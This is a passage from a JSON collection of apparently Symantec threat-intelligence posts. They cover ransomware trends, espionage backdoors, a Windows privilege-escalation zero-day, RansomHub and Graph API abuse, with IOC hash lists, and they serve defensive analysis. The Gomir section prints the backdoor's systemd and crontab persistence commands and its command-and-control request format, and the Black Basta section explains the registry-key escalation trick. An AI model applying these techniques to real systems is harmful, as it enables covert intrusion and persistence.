updating its toolset to continue its espionage activities with minimal disruption. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/daggerfly-espionage-updated-toolset"
  },
  {
    "title": "ransomware q2 2024",
    "content": "Ransomware activity fell slightly during the first quarter of 2024, most likely as a result of disruption to two major ransomware groups. However, overall activity levels remain on an upward trend and the number of attacks claimed in the first quarter of 2024 was ahead of attacks claimed in the corresponding quarter of 2023. Analysis of data from ransomware leak sites found that ransomware actors claimed 962 attacks in the first quarter of 2024. The figure was down from the 1,190 attacks claimed in the fourth quarter of 2023, but still above the 886 attacks claimed in the first quarter of 2023. The drop in overall activity levels is likely linked to disruption experienced by LockBit and Noberus, which were the two most prolific ransomware operations in 2023. Noberus (aka ALPHV, BlackCat)was the target of a U.S.-led law enforcement operationin December 2023. Although Noberus attempted to reestablish itself in the following weeks, it eventually closed in March 2024, citing the impact of the law enforcement operation, amid reports of a falling out with many of its affiliates. LockBit meanwhile was thetarget of a second international law enforcement operationin February 2024, but it has continued to operate. LockBit’s position as the number one ransomware threat remained unchallenged in the first quarter of 2024, accounting for over 20% of all claimed attacks. It was followed by Play, which was recently reported as having started a ransomware-as-a-service (7%), the prolific Phobos affiliate 8Base (6%), and the emergent Qilin ransomware (6%). Once again, there were some big disparities between overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit in both cases counted for the largest proportion of attacks, Akira was the second most prevalent ransomware family in attacks investigated by Symantec in Q1 (14%), yet it only accounted for 5.5% of all claimed attacks. Similarly, Blacksuit was involved in 11% of attacks investigated by Symantec, but only claimed 1.6% of all publicly reported attacks. The comparison may give some indication of success rates experienced by actors linked to each operation. For Symantec to positively identify an attack as associated with a certain ransomware family, the attack has to advance to the stage where the attackers attempt to deploy a payload. This suggests that attackers using Akira and Blacksuit are more likely to advance their attacks at least to the payload deployment stage. Available evidence suggests that exploitation of known vulnerabilities in public-facing applications continues to be the main vector for ransomware attacks. Attackers are continuing to target recently patched vulnerabilities in a bid to find unpatched systems. For example, in recent weeks, Symantec uncovered an ongoing campaign where attackers targeted web servers by exploiting a recently disclosed PHP vulnerability. The vulnerability (CVE-2024-4577) is a CGI argument injection flaw affecting all versions of PHP installed on the Windows operating system. The issue also affects all versions of the XAMPP development environment installed on Windows. Successful exploitation of the vulnerability can lead to remote code execution. Once the attackers gain access to a vulnerable server, they download several tools, including a malicious HTA file that contains a copy of the open-source privilege-escalation tool BadPotato; a custom web shell; and a loader previously observed being used to deploy TellYouThePass ransomware. One notable development in Q1 was the return of the Clop (aka Cl0p) ransomware. Clop is operated by the Snakefly cybercrime group and fell into disuse during 2023 as the group began to forego encryption and focus purely on data theft for extortion. The threat actors achieve this chiefly by exploiting zero-day vulnerabilities in software that allow them to hit multiple victims at once, stealing their data before the activity is discovered, and threatening to publish it if a ransom isn’t paid. The most high-profile attack Snakefly was involved in in 2023 was theexploitation of vulnerabilities in Progress Software’s MOVEit Transfer managed file-transfer application. However, in recent weeks Symantec’s Threat Hunter Team has seen the Clop payload being used once again, suggesting that Snakefly is returning to mounting conventional double extortion attacks. Bring-Your-Own-Vulnerable-Driver (BYOVD) continues to be a favored tactic among ransomware groups, particularly as a means of disabling security solutions. Since drivers are signed and can obtain kernel access, they are frequently used to kill processes. A correctly written driver will contain checks to ensure that only the software it’s designed to work with is issuing commands and that it’s only used for its intended purpose.  A vulnerable driver, in the wrong hands, becomes a de facto privilege escalation tool. The most recently seen tool in this category is Warp AV Killer, which has been used by at least one LockBit affiliate in recent weeks and leverages a vulnerable Avira anti-rootkit driver to disable security products. Although ransomware operations have experienced a high level of disruption to date in 2024, the impact on activity levels has been relatively limited. Ransomware is likely to continue as one of the main threats faced by enterprises for the foreseeable future. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 4de4621da1b7da597c2c8def4c08b8d405672dadb9c70d7dffd647c8d6abd394 – Web shell 95279881525d4ed4ce25777bb967ab87659e7f72235b76f9530456b48a00bac3 – Loader 5e446efb6c4f296fb8f25ef7a1a0a482f51dc475bd5ef3e89be9d43782a9f60f – TellYouThePass 7d6877eb8a3e2da1e8b06e2ed41604c6c3d5ced8293f7cc7e760ba972303bd0e – TellYouThePass f572898ab9f9a0fabac77d5d388680f84f85f9eb2c01b4e5de426430c6b5008f – TellYouThePass 7101db8cb05e989c018ebc5df47819029cd76c4093b22c4582288795e46f6689 – TellYouThePass 2881194b7e0939d47165c894c891737d8c189ee8fb4720e814a4bcdd804d00d1 – TellYouThePass ea59d6a130a279dfde4df53640bd720419c7b5d9711a21a78af9453b1b3b5805 – TellYouThePass 170d654b61810992fef6f18dbce5b4c7f5762cf36c9b41c36a14c9f6609f6e7d – TellYouThePass aa0ef20f9f8ca111b0d8a550daf6651f5b0557f0acb0a26545755c5a02263a9b – TellYouThePass 3e65437f910f1f4e93809b81c19942ef74aa250ae228caca0b278fc523ad47c5 – TellYouThePass 2fc2d747847eb04561a435e65954f0103101e2190458eb3c125deda49326c597 – TellYouThePass 21ff399e57cc306a1ae1daab6009ea40c8aa96c39296d0f8781626de6bd19256 – TellYouThePass d18453e564ca27514227478f225d85811fe15d08aa5fb1f613022c43155c5c54 – TellYouThePass 9562ad2c173b107a2baa7a4986825b52e881a935deb4356bf8b80b1ec6d41c53 – TellYouThePass 3f41e2ceff3a04cd6de6aadce7e7b7c8584940e4320a7db55dd712debb061510 – Clop 4d571f4d0008deb01e3144e0e3d5f882c5422acfcb4dd260082852a822d8d2fb – Clop 6192488729850a7a28498f233346e856b0097e4b3160baa641f8cf9571b56da8 – Clop a702a671b7911a09ccb5b4f42923e8b301e0bbb851443dd52622022959a3055a – Clop bef2d817f1813eb0629222112fd3721865a2a4eb1f4d51ad1f09fd807d4380ab – Clop f6afa84b0847414220bb15517b8b5e2c505b64b53efbba73b753379c66ac5017 – Clop 6fb438feeb8369c5b82bfaa77144a641f7645c321f0b24dd97cfe2687b1ebd44 – Suspected Clop 88efa81984852dac62d325f2091a09de1e6423a711d7913aeac103c50664cf84 – Suspected Clop 38f0750cbe49b30db326b53b9f752b66c4f5e23cc3bbbd6d1844e2878a19b9a7 – Suspected Clop aa43f34c3fa67aea994c1babeb71b46c7b24eccaa0455ae21aa561e251e7cc4d – Suspected Clop 1453179d46ef89eb780f8b82632f352017a3586e8d49fc3f087f633f7bebbf0a – Warp AV Killer 67e4c18e80d4d1acb9395f4a1fe9c2a75d95fcccdb33bcdd5259ba6f47e60e57 – Warp AV Killer The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-q2-2024"
  },
  {
    "title": "telecoms espionage asia",
    "content": "Attackers using tools associated with Chinese espionage groups have breached multiple telecom operators in a single Asian country in a long-running espionage campaign. The attackers placed backdoors on the networks of targeted companies and also attempted to steal credentials. The attacks have been underway since at least 2021, with evidence to suggest that some of this activity may even date as far back as 2020. Virtually all of the organizations targeted were telecoms operators, with the addition of a services company that serves the telecoms sector and a university in another Asian country. Custom malware associated with a number of China-linked espionage actors was used in the campaign, including: Coolclient:A backdoor associated with the Fireant group (aka Mustang Panda, Earth Preta). Its functionality includes logging keystrokes, reading and deleting files, and communication with a command and control (C&C) server. Variants of the backdoor used in this campaign were similar to onedocumented by Trend in 2023. A version of the legitimate VLC Media Player masquerading as a Google file (googleupdate.exe) was used to sideload a Coolclient loader (file name: libvlc.dll). The loader reads an encrypted payload from a file named loader.ja. This payload will in turn read a second encrypted payload from a file named goopdate.ja and inject it into the winver.exe process. Quickheal:A backdoor that has been long associated with the Neeedleminer group (aka RedFoxtrot, Nomad Panda). The variant of Quickheal used in this campaign was a 32-bit DLL named RasTls.dll, which had an export named GetOfficeDatatal. Analysis of the malware revealed that it was almost identical to Quickheal variantsdocumented by Recorded Future in 2021, the only differences being new configuration details in the compiled code and VMProtect obfuscations. The backdoor communicated with a hardcoded C&C server named swiftandfast.net using TCP port 443. It used a custom communications protocol that was designed to look like SSL traffic but used its own encryption instead. Rainyday:A backdoor associated with the Firefly group (aka Naikon). Most of the Rainyday variants used during the campaign were executed using a loader named fspmapi.dll. The loader is sideloaded using a legitimate F-Secure executable named fsstm.exe. When loaded, it obtains the disk folder of the executable that started the process and sets it as the current directory. It then obtains the memory location of the executable and patches its memory image. This appears to be done in order to hijack the execution flow when the malware is loaded by a certain executable. If the hijack is successful, the loader reads from a file called dataresz, decrypts the payload with a single byte XOR key (0x2D) and executes it as shellcode. Minor variants of the above include one with an invalid digital signature by \"Kaspersky Lab\" and another whose loader reads the encrypted shellcode from a file named iReports. Another variant is executed using a loader named security.dll. It is sideloaded using an executable called msproxy.exe,which is an application called Proxifier, developed by Initex. The executable’s default name is ProxyChecker.exe and was likely renamed to masquerade as a Microsoft file. In this case, the loader reads the encrypted shellcode from a file named nod193100. The XOR key used is also different: 0xF6. Two files with the name nod193100 found on VirusTotal were, on analysis, found to be similar to a loader used for the Rainyday backdoordocumented by Bitdefender in 2021. Aside from the custom backdoors mentioned above, the attackers used a variety of other tactics, techniques, and procedures (TTPs): Tools used in this campaign have strong associations with multiple Chinese groups and at least three of the custom backdoors deployed are believed to be used exclusively by Chinese espionage actors. Coolclient is tied to the Fireant group while Quickheal is associated with the Needleminer group. Rainyday, meanwhile, has always been used by the Firefly group. All three groups are widely considered by multiple security firms, including Symantec, to be operating from China. The United States–China Economic and Security Review Commission, an independent advisory body established by the U.S. Congress,has described Fireflyas an \"APT possibly associated with Unit 78020 (PLA) that operates in the southern theater command’s area of responsibility (AOR).\" The nature of the link between the actors involved in the current campaign remains unclear. Possibilities include, but are not limited to: The ultimate motive of the intrusion campaign remains unclear. The attackers may have been gathering intelligence on the telecoms sector in that country. Eavesdropping is another possibility. Alternatively, the attackers may have been attempting to build a disruptive capability against critical infrastructure in that country. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 089809e73354648b3caed7db6bc24dcce4f2ef0f327206fd14f36c6619d9ed30 – Rainyday loader 1906e7d5a745a364c91f5e230e16e1566721ace1183a57e8d25ff437664c7d02 – Quickheal 3aae73ff8ff5973c74af5a7991ca6a57ce797b7b775e1358efd9d76b67b5797b – Rainyday loader 4c136270ca4c17edb77985aca570e291fa77abaaa48761f85e184892089164a6 – Coolclient 6a5fdbe9579b69d4a5e1f6930145debd5adb2a9f93dd052bfb442cbd0141277b – Coolclient 6ad67d7f76986359865667bdd51ba267f6bd7e560270512074448dd7b088bcb7 – Rainyday loader c348eba51897fbd55ca3ffdaab21259b8f73688e6e008b923ebc597c6272d2d9 – Coolclient c61daa0df88a33387b94b22bfc0b68d1211a57357aff401613c07832b5192fc0 – Rainyday loader dc9a12574f8c3b5bed6043b1cd3fd43672779d132c864bb22ae8b0a5dee24576 –Rainyday loader e32c5e6d70895f0d071f420b7ff28c6fe0eaf2c08eeebe39122b3b1fd1981473 – Rainyday loader f45dabd683795f099a40553e5d85c9bc8a15bb964c992b45cec48c620ff78fdb – Rainyday loader The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/telecoms-espionage-asia"
  },
  {
    "title": "black basta ransomware zero day",
    "content": "The Cardinal cybercrime group (aka Storm-1811, UNC4393), which operates the Black Basta ransomware, may have been exploiting a recently patched Windows privilege escalation vulnerability as a zero-day. The vulnerability (CVE-2024-26169) occurs in the Windows Error Reporting Service. If exploited on affected systems, it can permit an attacker to elevate their privileges. The vulnerability was patched on March 12, 2024, and, at the time, Microsoft said there was no evidence of its exploitation in the wild. However, analysis of an exploit tool deployed in recent attacks revealed evidence that it could have been compiled prior to patching, meaning at least one group may have been exploiting the vulnerability as a zero-day. The exploit tool was deployed in a recent attempted ransomware attack investigated by Symantec’s Threat Hunter Team. Although the attackers did not succeed in deploying a ransomware payload in this attack, the tactics, techniques, and procedures (TTPs) used were highly similar to those described in arecent Microsoft report detailing Black Basta activity. These included the use of batch scripts masquerading as software updates. Although no payload was deployed, the similarities in TTPs makes it highly likely it was a failed Black Basta attack. Analysis of the exploit tool revealed that it takes advantage of the fact that the Windows file werkernel.sys uses a null security descriptor when creating registry keys. Because the parent key has a “Creator Owner” access control entry (ACE) for subkeys, all subkeys will be owned by users of the current process. The exploit takes advantage of this to create a \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe\" registry key where it sets the \"Debugger\" value as its own executable pathname. This allows the exploit to start a shell with administrative privileges. The variant of the tool used in this attack (SHA256: 4aae231fb5357c0647483181aeae47956ac66e42b6b134f5b90da76d8ec0ac63) had a compilation time stamp of February 27, 2024, several weeks before the vulnerability was patched. A second variant of the tool discovered on Virus Total (SHA256: b73a7e25d224778172e394426c98b86215087d815296c71a3f76f738c720c1b0) had an earlier compilation time stamp of December 18, 2023. Time stamp values in portable executables are modifiable, which means that a time stamp is not conclusive evidence that the attackers were using the exploit as a zero-day. However, in this case there appears to be little motivation for the attackers to change the time stamp to an earlier date. Cardinal introduced Black Basta in April 2022 and from its inception, the ransomware was closely associated with the Qakbot botnet, which appeared to be its primary infection vector. Qakbot was one of the world’s most prolific malware distribution botnets until itwas taken down following law enforcement action in August 2023. However, while the takedown led to a dip in Black Basta activity, Cardinal has since resumed attacks andnow appears to have switched to working with the operators of the DarkGate loaderto obtain access to potential victims. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 4aae231fb5357c0647483181aeae47956ac66e42b6b134f5b90da76d8ec0ac63 – Exploit tool b73a7e25d224778172e394426c98b86215087d815296c71a3f76f738c720c1b0 – Exploit tool a31e075bd5a2652917f91714fea4d272816c028d7734b36c84899cd583181b3d – Batch script 3b3bd81232f517ba6d65c7838c205b301b0f27572fcfef9e5b86dd30a1d55a0d – Batch script 2408be22f6184cdccec7a34e2e79711ff4957e42f1ed7b7ad63f914d37dba625 – Batch script b0903921e666ca3ffd45100a38c11d7e5c53ab38646715eafc6d1851ad41b92e – ScreenConnect The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/black-basta-ransomware-zero-day"
  },
  {
    "title": "ransomhub knight ransomware",
    "content": "RansomHub, a new Ransomware-as-a-Service (RaaS) that has rapidly become one of the largest ransomware groups currently operating, is very likely an updated and rebranded version of the older Knight ransomware. Analysis of the RansomHub payload by Symantec, part of Broadcom, revealed a high degree of similarity between the two threats, suggesting that Knight was the starting point for RansomHub. Despite shared origins, it is unlikely that Knight’s creators are now operating RansomHub. Source code for Knight (originally known as Cyclops) wasoffered for sale on underground forums in February 2024after Knight’s developers decided to shut down their operation. It is possible that other actors bought the Knight source code and updated it before launching RansomHub. Both payloads are written in Go and most variants of each family are obfuscated withGobfuscate.  Only some early versions of Knight are not obfuscated. The degree of code overlap between the two families is significant, making it very difficult to differentiate between them.  In many cases, a determination could only be confirmed by checking the embedded link to the data leak site. The two families have virtually identical help menus available on the command line. The sole difference is the addition of a sleep command in RansomHub. Both threats employ a unique obfuscation technique, where important strings are each encoded with a unique key and decoded at runtime. For example, in the command “cmd.exe /c iisreset.exe /stop”, only the iisrest.exe string is encrypted with a unique key. There are significant similarities between the ransom notes left by both payloads, with many phrases used by Knight appearing verbatim in the RansomHub note, suggesting that the developers simply edited and updated the original note. One of the main differences between the two ransomware families is the commands run through cmd.exe. These commands may be configured when the payload is built or during configuration.  Although the commands themselves are different, the way and order in which they are called relative to other operations is the same. A unique feature present in both Knight and RansomHub is the ability to restart an endpoint in safe mode before starting encryption. This technique was previously employed by Snatch ransomware in 2019 and allows encryption to progress unhindered by operating system or other security processes. Snatch is also written in Go and has many similar features, suggesting it could be another fork of the same original source code used to develop Knight and RansomHub. However, Snatch contains significant differences, including an apparent lack of configurable commands or any sort of obfuscation. Another ransomware family thatrestarts the affected computer in safe mode before encryption is NoberusInterestingly, the encryptor stores its configuration in a JSONwhere keywords match what was observed in RansomHub. In recent RansomHub attacks investigated by Symantec, the attackers gained initial access by exploiting the Zerologon vulnerability (CVE-2020-1472), which can allow an attacker to gain domain administrator privileges and take control of the entire domain. The attackers used several dual-use tools before deploying the ransomware. Atera and Splashtop were used to facilitate remote access, while NetScan was used to likely discover and retrieve information about network devices. The RansomHub payload leveraged the iisreset.exe and iisrstas.exe command-line tools to stop all Internet Information Services (IIS) services. Despite only first appearing in February 2024, RansomHub has managed to grow very quickly and, over the past three months, was the fourth most prolific ransomware operator in terms of numbers of attacks publicly claimed. The group last weekclaimed responsibility for an attack on UK auction house Christies. One factor contributing to RansomHub’s growth may be the group’s success in attracting some large former affiliates of the Noberus (aka ALPHV, Blackcat) ransomware group, which closed earlier this year. One former Noberus affiliate known as Notchyis now reportedly working with RansomHub. In addition to this, tools previously associated with another Noberus affiliate known as Scattered Spider, were used in a recent RansomHub attack. The speed at which RansomHub has established its business suggests that the group may consist of veteran operators with experience and contacts in the cyber underground. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomhub-knight-ransomware"
  },
  {
    "title": "springtail kimsuky backdoor espionage",
    "content": "Symantec’s Threat Hunter Team has uncovered a new Linux backdoor developed by the North Korean Springtail espionage group (aka Kimsuky) that is linked to malware used in a recent campaign against organizations in South Korea. The backdoor (Linux.Gomir) appears to be a Linux version of the GoBear backdoor, which was used in a recent Springtail campaign that saw the attackers deliver malware via Trojanized software installation packages. Gomir is structurally almost identical to GoBear, with extensive sharing of code between malware variants. Springtail is a tight-knit espionage group that initially specialized in attacks on public sector organizations in South Korea. The group first came to public attention in 2014, when the South Korean governmentsaid it was responsible for an attack on Korea Hydro and Nuclear Power (KHNP). Multiple employees at KHNP were targeted with spear-phishing emails containing exploits that installed disk-wiping malware on their machines. The U.S. government has said that the group is a unit of North Korea’s military intelligence organization, the Reconnaissance General Bureau (RGB). The group was the subject of a U.S. government alert in recent days due to attempts to exploit improperly configured DNS Domain-based Message Authentication, Reporting and Conformance (DMARC) record policies to conceal social engineering attempts.According to a joint advisory issued by the Federal Bureau of Investigation (FBI), the U.S. Department of State, and the National Security Agency (NSA), the group has been mounting spear phishing campaigns pretending to be journalists, academics, and experts in East Asian affairs “with credible links to North Korean policy circles”. The campaign,which was first documented by South Korean security firm S2W in February 2024, saw Springtail deliver a new malware family named Troll Stealer using Trojanized software installation packages. Troll Stealer can steal a range of information from infected computers including files, screenshots, browser data, and system information. Written in Go, like many newer Springtail malware families, Troll Stealer contained a large amount of code overlap with earlier Springtail malware. Troll Stealer’s functionality included the ability to copy the GPKI (Government Public Key Infrastructure) folder on infected computers.GPKI is the public key infrastructure schemafor South Korean government personnel and state organizations, suggesting that government agencies were among the targets of the campaign. S2W reported that the malware was distributed inside installation packages for TrustPKI and NX_PRNMAN, software developed by SGA Solutions. The installation packages were reportedly downloaded from a page that was redirected from a specific website. South Korean security firm AhnLabsubsequently provided further detailson the downloads, saying they originated from the website of an association in the construction sector. The website required users to log in and the affected packages were among those users had to install to do so. Symantec has since discovered that Troll Stealer was also delivered in Trojanized Installation packages for Wizvera VeraPort. It is unclear how these installation packages were delivered during the current campaign. Wizvera VeraPort waspreviously reported to have been compromisedin a North Korea-linked software supply chain attack in 2020. Troll Stealer appears to be related to another recently discovered Go-based backdoor named GoBear. Both threats are signed with a legitimate certificate issued to “D2innovation Co.,LTD”. GoBear also contains similar function names to an older Springtail backdoor known as BetaSeed, which was written in C++, suggesting that both threats have a common origin. AhnLab later explicitly linked the two threats, saying that many of the malicious installers it had analyzed contained both Troll Stealer and either of the GoBear or BetaSeed backdoors, which it referred to as the Endoor malware family. Several weeks later, GoBear was being distributed by a dropper masquerading as an installer for an app for a Korean transport organization. In this case, the attackers did not Trojanize a legitimate software package but instead disguised the dropper as an installer featuring the organization’s logos. The dropper was signed with what appeared to be a stolen certificate. Symantec’s investigation into the attacks uncovered a Linux version of this malware family (Linux.Gomir) which is structurally almost identical and shares an extensive amount of distinct code with the Windows Go-based backdoor GoBear. Any functionality from GoBear that is operating system-dependent is either missing or reimplemented in Gomir. When executed, it checks its command line and if contains the string “install” as its only argument, it will attempt to install itself with persistence. To determine how it installs itself, Gomir checks the effective group ID (as reported by the getegid32() syscall) of its own process. If the process is running as group 0, Gomir assumes that it is running with superuser privileges and attempts to copy itself as the following file: It then attempts to create a systemd service with the name \"syslogd\" by creating the file: /etc/systemd/system/syslogd.service ExecStart=/bin/sh -c \"/var/log/syslogd\" WantedBy=multi-user.target Gomir will then enable and start the created service by executing the following sequence of commands: ${SHELL} -c systemctl daemon-reload ${SHELL} -c systemctl reenable syslogd ${SHELL} -c systemctl start syslogd It will then delete the original executable and terminate the original process. If the process is running as any group other than 0, Gomir attempts to configure a crontab to start the backdoor on every reboot. It first creates a helper file (cron.txt) in the current working directory with the following content: @reboot [PATHNAME_OF_THE_EXECUTING_PROCESS] Next, it seems to attempt to list any pre-existing crontab entries by running the following command: /bin/sh -c crontab -l It appends the output to the created helper file. Gomir then updates the crontab configuration by executing the following command: ${SHELL} -c crontab cron.txt Gomir then deletes the helper file before executing itself without any command-line parameters. Once installed and running, Gomir periodically communicates with its command-and-control (C&C) server by sending HTTP POST requests to: http://216.189.159[.]34/mir/index.php When pooling for commands to execute, Gomir requests with the following HTTP request body: a[9_RANDOM_ALPHANUMERIC_CHARACTERS]=2&b[9_RANDOM_ALPHANUMERIC_CHARACTERS]=[INFECTION_ID]1&c[9_RANDOM_ALPHANUMERIC_CHARACTERS]= The INFECTION_ID is generated using the following method: def generate_infection_id(hostname, username): hexdigest = hashlib.md5(hostname + username).hexdigest() return \"g-\" + hexdigest[:10] The expected body of the HTTP server response is a string starting with the letter S. Gomir then attempts to decode the remaining characters of the string using the Base64 algorithm. The decoded blob has the following structure: Gomir then uses a custom encryption algorithm to decrypt the previously discussed command. The first two characters of the command identify the operation to execute. Gomir allows the execution of 17 different commands. The commands are almost identical to those supported by the GoBear Windows backdoor: This latest Springtail campaign provides further evidence that software installation packages and updates are now among the most favored infection vectors for North Korean espionage actors. Variations of this tactic include: The most notable example to date is the3CX supply chain attack, which itself was the result of the earlierX_Trader supply chain attack. Springtail, meanwhile, has focused on Trojanized software installers hosted on third-party sites requiring their installation or masquerading as official apps. The software targeted appears to have been carefully chosen to maximize the chances of infecting its intended South Korean-based targets. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 30584f13c0a9d0c86562c803de350432d5a0607a06b24481ad4d92cdf7288213 – Linux.Gomir 7bd723b5e4f7b3c645ac04e763dfc913060eaf6e136eecc4ee0653ad2056f3a0 – GoBear Dropper d7f3ecd8939ae8b170b641448ff12ade2163baad05ca6595547f8794b5ad013b – Troll Stealer 36ea1b317b46c55ed01dd860131a7f6a216de71958520d7d558711e13693c9dc – Troll Stealer 8e45daace21f135b54c515dbd5cf6e0bd28ae2515b9d724ad2d01a4bf10f93bd – Troll Stealer 6c2a8e2bbe4ebf1fb6967a34211281959484032af1d620cbab390e89f739c339 – Troll Stealer 47d084e54d15d5d313f09f5b5fcdea0c9273dcddd9a564e154e222343f697822 – Troll Stealer 8a80b6bd452547650b3e61b2cc301d525de139a740aac9b0da2150ffac986be4 - Troll Stealer 380ec7396cc67cf1134f8e8cda906b67c70aa5c818273b1db758f0757b955d81  – Troll Stealer ff945b3565f63cef7bb214a93c623688759ee2805a8c574f00237660b1c4d3fd – Troll Stealer cc7a123d08a3558370a32427c8a5d15a4be98fb1b754349d1e0e48f0f4cb6bfc  – Troll Stealer 8898b6b3e2b7551edcceffbef2557b99bdf4d99533411cc90390eeb278d11ac8 – Troll Stealer ecab00f86a6c3adb5f4d5b16da56e16f8e742adfb82235c505d3976c06c74e20 – Troll Stealer d05c50067bd88dae4389e96d7e88b589027f75427104fdb46f8608bbcf89edb4 – Troll Stealer a98c017d1b9a18195411d22b44dbe65d5f4a9e181c81ea2168794950dc4cbd3c – Troll Stealer 831f27eb18caf672d43a5a80590df130b0d3d9e7d08e333b0f710b95f2cde0e0 – Troll Stealer bc4c1c869a03045e0b594a258ec3801369b0dcabac193e90f0a684900e9a582d – Troll Stealer 5068ead78c226893df638a188fbe7222b99618b7889759e0725d85497f533e98 – Troll Stealer The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/springtail-kimsuky-backdoor-espionage"
  },
  {
    "title": "graph api threats",
    "content": "An increasing number of threats have begun to leverage the Microsoft Graph API, usually to facilitate communications with command-and-control (C&C) infrastructure hosted on Microsoft cloud services. The technique was most recently used in an attack against an organization in Ukraine, where a previously undocumented piece of malware used the Graph API to leverage Microsoft OneDrive for C&C purposes. The malware found in Ukraine appeared to be named BirdyClient or OneDriveBirdyClient by its developers because references to both names were found in its code. Its file name—vxdiff.dll—was the same as a legitimate DLL associated with an application called Apoint (apoint.exe), which is driver software for Alps pointing devices, usually found in laptops. Whether the malware was simply masquerading as a legitimate file or whether it was being sideloaded by Apoint remains unknown. Analysis of the BirdyClient malware (Trojan.BirdyClient) revealed that its main functionality is to connect to the Microsoft Graph API and use Microsoft OneDrive as a C&C server mechanism to upload and download files from it. The sample also creates the following log file: %AllUsersProfile%/{0134AA2C-03BE-448D-8D28-7FFE94EA3A49}/config/001.temp To date, no related tools have been found. It remains unclear who the developers of the threat are and what their motivation is. Graph is a Microsoft API designed to allow developers to access resources hosted on Microsoft cloud services, such as Microsoft 365. Authentication is carried out using OAuth access tokens. Graph can be used to access a wide range of data and services such as email, calendar events, files, or devices. Application developers can potentially use it to pull data from one or more Microsoft services and integrate it into their own solutions. BirdyClient is the latest threat seen leveraging the Graph API. The first known usage was by the North Korea-linked Vedalia espionage group (aka APT37), which developed Bluelight, a second-stage payload that could communicate with several different cloud services for C&C purposes.According to Volexity, which discovered Bluelight, the variant it analyzed used the Graph API to communicate with OneDrive. In October 2021,Symantec uncovered the Harvester group, a nation-state-backed espionage operation, targeting organizations in South Asia. Its toolset included a custom backdoor called Backdoor.Graphon that used the Graph API to communicate with Microsoft infrastructure for C&C purposes. The technique came to further public attention in January 2022,with the discovery of Graphite—malware that used the Graph API to communicate with a OneDrive account that was acting as a C&C server. Graphite was deployed in a campaign against several governments in Europe and Asia. Attacks began with spear-phishing emails that delivered an Excel downloader containing a remote code execution exploit (CVE-2021-40444). This led to the installation of a second-stage downloader, followed by Graphite and a secondary payload—PowerShell Empire. The campaign was eventually linked to the Russian Swallowtail espionage group (aka APT28, Fancy Bear). Other espionage groups appeared to be quick to learn from early users and began leveraging the Graph API in their toolset. In December 2022, Elastic Securitydocumented an intrusion into the Foreign Affairs Office of an ASEAN member. Among the tools deployed was SiestaGraph, which used the Graph API to interact with both OneDrive and Microsoft 365 Mail for C&C purposes. SiestaGraph appears to be in continuous development. In September 2023, Symantec found a new variant of the malware that contained different command identifiers from those originally documented. In June 2023,Symantec discovered Backdoor.Graphican, which was being used by the Flea (aka APT15, Nickel) advanced persistent threat (APT) group in an espionage campaign heavily focused on foreign affairs ministries in the Americas. Graphican is an evolution of an older Flea backdoor known as Ketrican, which itself was based on a previous malware—BS2005—that was also used by Flea. Graphican has the same functionality as Ketrican, but its new features included the use of the Microsoft Graph API and OneDrive to obtain its C&C infrastructure. Others are learning from its use in the wild. For example, penetration-testing firm RedSiegerecently announced the development of GraphStrike, a toolset that works with Cobalt Strike to enable the Cobalt Strike Beacon payload to use the Graph API for HTTPS C&C communications. Attacker communications with C&C servers can often raise red flags in targeted organizations. The Graph API’s popularity among attackers may be driven by the belief that traffic to known entities, such as widely used cloud services, is less likely to raise suspicions. In addition to appearing inconspicuous, it is also a cheap and secure source of infrastructure for attackers since basic accounts for services like OneDrive are free. As awareness grows of this tactic, the number of attackers attempting to leverage Graph may grow further. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. afeaf8bd61f70fc51fbde7aa63f5d8ad96964f40b7d7fce1012a0b842c83273e –BirdyClient 5c430e2770b59cceba1f1587b34e686d586d2c8ba1908bb5d066a616466d2cc6 – Bluelight 470cd1645d1da5566eef36c6e0b2a8ed510383657c4030180eb0083358813cd3 – Graphon f229a8eb6f5285a1762677c38175c71dead77768f6f5a6ebc320679068293231 – Graphite 4b78b1a3c162023f0c14498541cb6ae143fb01d8b50d6aa13ac302a84553e2d5 – Graphican a78cc475c1875186dcd1908b55c2eeaf1bcd59dedaff920f262f12a3a9e9bfa8 – Graphican 02e8ea9a58c13f216bdae478f9f007e20b45217742d0fbe47f66173f1b195ef5  – Graphican 